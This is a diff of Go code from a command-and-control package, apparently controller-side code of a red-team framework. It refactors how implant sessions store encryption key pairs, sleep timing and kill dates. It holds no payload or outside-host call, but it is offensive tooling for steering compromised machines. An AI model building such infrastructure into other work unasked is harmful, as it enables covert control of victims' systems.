@@ -1,4 +1,5 @@
 //go:build !implant
+// +build !implant
 
 // Copyright (C) 2020 - 2023 iDigitalFlame
 //
@@ -19,7 +20,6 @@
 package c2
 
 import (
-	"strconv"
 	"sync"
 	"time"
 
@@ -48,8 +48,7 @@ var ErrNoTask = xerr.Sub("no Job created for client Session", 0x58)
 // This struct does some automatic handling and acts as the communication
 // channel between the client and server.
 type Session struct {
-	lock   sync.RWMutex
-	keyNew *data.Key
+	lock sync.RWMutex
 
 	Last    time.Time
 	Created time.Time
@@ -65,17 +64,18 @@ type Session struct {
 	Shutdown func(*Session)
 	Receive  func(*Session, *com.Packet)
 	proxy    *proxyBase
-	tick     *time.Ticker
+	tick     *sleeper
 	peek     *com.Packet
 	host     container
 	proxies  []proxyData
-	kill     *time.Time
+	kill     time.Time
 	work     *cfg.WorkHours
 
-	Device device.Machine
-	sleep  time.Duration
-	state  state
-	key    data.Key
+	Device   device.Machine
+	sleep    time.Duration
+	state    state
+	keysNext *data.KeyPair
+	keys     data.KeyPair
 
 	ID             device.ID
 	jitter, errors uint8
@@ -267,7 +267,7 @@ func (s *Session) Task(n *com.Packet) (*Job, error) {
 	_, ok := s.jobs[n.Job]
 	if s.lock.RUnlock(); ok {
 		if xerr.ExtendedInfo {
-			return nil, xerr.Sub("job "+strconv.FormatUint(uint64(n.Job), 10)+" already registered", 0x5B)
+			return nil, xerr.Sub("job "+util.Uitoa(uint64(n.Job))+" already registered", 0x5B)
 		}
 		return nil, xerr.Sub("job already registered", 0x5B)
 	}
@@ -323,17 +323,15 @@ func (s *Session) Tasklet(t task.Tasklet) (*Job, error) {
 // If this is a Server-side Session, the new value will be sent to the Client in
 // a MvTime Packet.
 func (s *Session) SetKillDate(t time.Time) (*Job, error) {
-	if t.IsZero() {
-		s.kill = nil
-	} else {
-		s.kill = &t
-	}
-	if s.parent == nil {
+	if s.kill = t; s.parent == nil {
 		return nil, ErrNoTask
 	}
 	n := &com.Packet{ID: task.MvTime, Device: s.Device.ID}
-	n.WriteUint8(timeKillDate)
-	n.WriteInt64(t.Unix())
+	if n.WriteUint8(timeKillDate); s.kill.IsZero() {
+		n.WriteInt64(0)
+	} else {
+		n.WriteInt64(t.Unix())
+	}
 	return s.Task(n)
 }
 
